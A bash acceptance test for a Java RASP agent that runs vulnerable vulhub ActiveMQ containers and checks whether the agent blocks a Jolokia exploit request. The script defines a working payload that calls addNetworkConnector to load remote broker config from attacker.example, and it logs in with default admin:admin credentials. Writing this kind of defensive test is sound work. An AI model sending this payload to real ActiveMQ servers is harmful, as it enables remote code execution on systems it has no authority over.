#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

agent_jar="/workspace/agent-java17/build/libs/ohmyrasp-agent-java17.jar"
host_agent_jar="$(pwd)/agent-java17/build/libs/ohmyrasp-agent-java17.jar"

payload='{"type":"exec","mbean":"org.apache.activemq:type=Broker,brokerName=localhost","operation":"addNetworkConnector(java.lang.String)","arguments":["static:(vm://evil?brokerConfig=xbean:http://attacker.example/poc.xml)"]}'

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java17:agentJava17Jar

cleanup_names=()
cleanup_dirs=()

register_cleanup() {
  cleanup_names+=("$1")
  cleanup_dirs+=("$2")
}

cleanup() {
  local index
  for index in "${!cleanup_names[@]}"; do
    docker logs "${cleanup_names[$index]}" > "${cleanup_dirs[$index]}/container.log" 2>&1 || true
    docker rm -f "${cleanup_names[$index]}" >/dev/null 2>&1 || true
  done
}
trap cleanup EXIT

wait_for() {
  local name="$1"
  local port="$2"
  local auth_required="$3"
  local curl_auth=()
  if [[ "$auth_required" == "true" ]]; then
    curl_auth=(-u admin:admin)
  fi
  for _ in $(seq 1 150); do
    if curl -fsS "${curl_auth[@]}" "http://127.0.0.1:${port}/api/jolokia/version" >/dev/null 2>&1; then
      return
    fi
    sleep 1
  done
  echo "${name} did not expose Jolokia at ${port}" >&2
  exit 1
}

run_case() {
  local version="$1"
  local image="$2"
  local baseline_name="$3"
  local protected_name="$4"
  local baseline_port="$5"
  local protected_port="$6"
  local auth_required="$7"
  local baseline_dir="logs/vulhub-activemq-${version}-java17-baseline"
  local protected_dir="logs/vulhub-activemq-${version}-java17-protected"
  local protected_log="${protected_dir}/events.jsonl"
  local curl_auth=()

  if [[ "$auth_required" == "true" ]]; then
    curl_auth=(-u admin:admin)
  fi

  rm -rf "$baseline_dir" "$protected_dir"
  mkdir -p "$baseline_dir" "$protected_dir"

  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

  docker run -d --name "$baseline_name" -p "${baseline_port}:8161" \
    -e JAVA_TOOL_OPTIONS= \
    "$image" >/dev/null
  register_cleanup "$baseline_name" "$baseline_dir"

  docker run -d --name "$protected_name" -p "${protected_port}:8161" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java17.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e JAVA_TOOL_OPTIONS="-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java17.jar -Dohmyrasp.java17.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java17.block=true" \
    "$image" >/dev/null
  register_cleanup "$protected_name" "$protected_dir"

  wait_for "$baseline_name" "$baseline_port" "$auth_required"
  wait_for "$protected_name" "$protected_port" "$auth_required"

  if [[ "$auth_required" == "true" ]]; then
    local baseline_unauth_status
    local protected_unauth_status
    baseline_unauth_status="$(
      curl -sS -o "${baseline_dir}/jolokia-version-unauth.json" -w "%{http_code}" \
        "http://127.0.0.1:${baseline_port}/api/jolokia/version" || true
    )"
    protected_unauth_status="$(
      curl -sS -o "${protected_dir}/jolokia-version-unauth.json" -w "%{http_code}" \
        "http://127.0.0.1:${protected_port}/api/jolokia/version" || true
    )"
    if [[ "$baseline_unauth_status" != "401" || "$protected_unauth_status" != "401" ]]; then
      cat "${baseline_dir}/jolokia-version-unauth.json" >&2 || true
      cat "${protected_dir}/jolokia-version-unauth.json" >&2 || true
      echo "ActiveMQ ${version} Jolokia did not require authentication" >&2
      exit 1
    fi
  fi

  curl -fsS "${curl_auth[@]}" "http://127.0.0.1:${baseline_port}/api/jolokia/version" \
    > "${baseline_dir}/jolokia-version.json"
  curl -fsS "${curl_auth[@]}" "http://127.0.0.1:${protected_port}/api/jolokia/version" \
    > "${protected_dir}/jolokia-version.json"

  if ! grep -q '"event":"ohmyrasp-java17-agent-start"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "missing Java 17 startup event in ActiveMQ ${version} protected container" >&2
    exit 1
  fi
  if grep -q '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "ActiveMQ ${version} protected startup produced a detection before the exploit request" >&2
    exit 1
  fi

  local baseline_status
  baseline_status="$(
    curl -sS "${curl_auth[@]}" -o "${baseline_dir}/add-network-connector.json" -w "%{http_code}" \
      -H 'Content-Type: application/json' \
      -d "$payload" \
      "http://127.0.0.1:${baseline_port}/api/jolokia/" || true
  )"
  if [[ ! "$baseline_status" =~ ^2 ]] \
      || ! grep -q '"status":200' "${baseline_dir}/add-network-connector.json"; then
    cat "${baseline_dir}/add-network-connector.json" >&2 || true
    echo "baseline ActiveMQ ${version} Jolokia addNetworkConnector did not reach the vulnerable MBean" >&2
    exit 1
  fi

  local protected_status
  protected_status="$(
    curl -sS "${curl_auth[@]}" -o "${protected_dir}/add-network-connector.json" -w "%{http_code}" \
      -H 'Content-Type: application/json' \
      -d "$payload" \
      "http://127.0.0.1:${protected_port}/api/jolokia/" || true
  )"
  if [[ ! "$protected_status" =~ ^2 ]] \
      || ! grep -q 'Java17RaspBlockException' "${protected_dir}/add-network-connector.json"; then
    cat "${protected_dir}/add-network-connector.json" >&2 || true
    echo "protected ActiveMQ ${version} Jolokia request was not blocked by Java17 RASP" >&2
    exit 1
  fi

  if ! grep -q '"algorithm":"java17_jmx_remote_config_source".*"action":"block"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "missing java17_jmx_remote_config_source block event for ActiveMQ ${version}" >&2
    exit 1
  fi
  if grep -q 'web-jsptaglibrary' "$protected_log"; then
    cat "$protected_log" >&2
    echo "ActiveMQ runtime JSP tag library DTD was incorrectly reported as XXE on ${version}" >&2
    exit 1
  fi

  echo "vulhub ActiveMQ ${version} Java17 acceptance passed"
}

run_case \
  "6.1.1" \
  "${OHMYRASP_VULHUB_ACTIVEMQ611_IMAGE:-vulhub/activemq:6.1.1}" \
  "${OHMYRASP_VULHUB_ACTIVEMQ611_BASELINE_NAME:-ohmyrasp-vulhub-activemq611-baseline}" \
  "${OHMYRASP_VULHUB_ACTIVEMQ611_PROTECTED_NAME:-ohmyrasp-vulhub-activemq611-protected}" \
  "${OHMYRASP_VULHUB_ACTIVEMQ611_BASELINE_PORT:-18261}" \
  "${OHMYRASP_VULHUB_ACTIVEMQ611_PROTECTED_PORT:-18262}" \
  "false"

run_case \
  "6.2.2" \
  "${OHMYRASP_VULHUB_ACTIVEMQ622_IMAGE:-vulhub/activemq:6.2.2}" \
  "${OHMYRASP_VULHUB_ACTIVEMQ622_BASELINE_NAME:-ohmyrasp-vulhub-activemq622-baseline}" \
  "${OHMYRASP_VULHUB_ACTIVEMQ622_PROTECTED_NAME:-ohmyrasp-vulhub-activemq622-protected}" \
  "${OHMYRASP_VULHUB_ACTIVEMQ622_BASELINE_PORT:-18263}" \
  "${OHMYRASP_VULHUB_ACTIVEMQ622_PROTECTED_PORT:-18264}" \
  "true"

echo "vulhub ActiveMQ 6.1.1 and 6.2.2 Java17 acceptance passed"
